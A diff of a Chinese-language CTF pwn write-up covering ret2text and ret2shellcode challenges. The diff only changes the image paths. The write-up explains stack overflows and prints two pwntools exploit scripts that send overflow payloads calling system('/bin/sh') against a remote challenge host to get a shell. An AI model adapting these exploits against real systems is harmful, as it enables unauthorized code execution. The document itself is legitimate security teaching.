@@ -425,39 +425,39 @@ buf存在栈溢出，无其他问题，F12查看
             <div id="articleContent">
                 <p><strong>ret2text</strong></p>
 <p><strong>checksec</strong></p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20164828.png" alt="屏幕截图 2025-01-19 164828"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20164828.png" alt="屏幕截图 2025-01-19 164828"></p>
 <p>NX保护开启</p>
 <p><strong>IDA分析</strong></p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20171625.png" alt="屏幕截图 2025-01-19 171625"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20171625.png" alt="屏幕截图 2025-01-19 171625"></p>
 <p>无异常，进入vuln函数</p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20171634.png" alt="屏幕截图 2025-01-19 171634"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20171634.png" alt="屏幕截图 2025-01-19 171634"></p>
 <p>buf存在栈溢出，无其他问题，F12查看</p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172645.png" alt="屏幕截图 2025-01-19 172645"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172645.png" alt="屏幕截图 2025-01-19 172645"></p>
 <p>发现有system和/bin/sh字符串就好办了，32位程序在运行中栈的结构是：<code>调用函数地址</code> -&gt; <code>函数返回地址</code> -&gt; <code>参数</code>，</p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172901.png" alt="屏幕截图 2025-01-19 172901"><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172918.png" alt="屏幕截图 2025-01-19 172918"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172901.png" alt="屏幕截图 2025-01-19 172901"><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172918.png" alt="屏幕截图 2025-01-19 172918"></p>
 <p>构造payload=b’a’*(0x88+0x4)+p32(0x8048320)+p32(1)+p32(0x804A024)；</p>
 <p><strong>exp:</strong></p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p=remote('61.147.171.105',63627)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload=b'a'*(0x88+0x4)+p32(0x8048320)+p32(1)+p32(0x804A024)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>ret2shellcode</strong></p>
 <p><strong>checksec</strong></p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174236.png" alt="屏幕截图 2025-01-19 174236"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174236.png" alt="屏幕截图 2025-01-19 174236"></p>
 <p>NX保护开启</p>
 <p><strong>IDA分析</strong></p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174643.png" alt="屏幕截图 2025-01-19 174643"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174643.png" alt="屏幕截图 2025-01-19 174643"></p>
 <p>主函数main无异常，进入hello函数</p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174652.png" alt="屏幕截图 2025-01-19 174652"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174652.png" alt="屏幕截图 2025-01-19 174652"></p>
 <p>最后是gets一个s，get就相当于read，s是我们输入的message信息的存储变量，猜测是要把s的地址全打满然后让溢出的内容被get到</p>
 <p>F12查看</p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20175519.png" alt="屏幕截图 2025-01-19 175519"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20175519.png" alt="屏幕截图 2025-01-19 175519"></p>
 <p>存在字符串system但并没有/bin/sh字符串</p>
 <p>查看name</p>
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20175718.png" alt="屏幕截图 2025-01-19 175718"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20175718.png" alt="屏幕截图 2025-01-19 175718"></p>
 <p>name处于bss段可以写入字符串/bin/sh,就可以构造payload，payload=b’a’*偏移量+p32(system_add)+p32(0)+p32(name_add)</p>
 <p><strong>Exp:</strong></p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote("61.147.171.105",61934)</span><br><span class="line">r.sendline('bin/sh')</span><br><span class="line">payload = b'a'*(0x26+4) + p32(0x08048420) +p32(0) + p32(0x0804A080) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="C:/Users/33942/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20180140.png" alt="屏幕截图 2025-01-19 180140"></p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20180140.png" alt="屏幕截图 2025-01-19 180140"></p>
 
                 
             </div>
